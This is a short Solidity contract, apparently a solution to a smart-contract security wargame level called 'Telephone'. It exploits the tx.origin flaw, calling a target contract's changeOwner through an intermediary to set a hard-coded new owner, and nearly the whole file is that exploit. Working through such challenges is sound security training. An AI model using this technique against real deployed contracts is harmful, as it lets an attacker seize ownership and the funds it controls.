// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneRunner {

  // This is the tx.origin attack
  function changeOwner() public {
    address newOwner = 0xcAc511DbF5415B09d08c58256562d0346AfD2478;
    Telephone(0x19F46253FCfa6fBA8b652e1f2243A76993472575).changeOwner(newOwner);
  }
}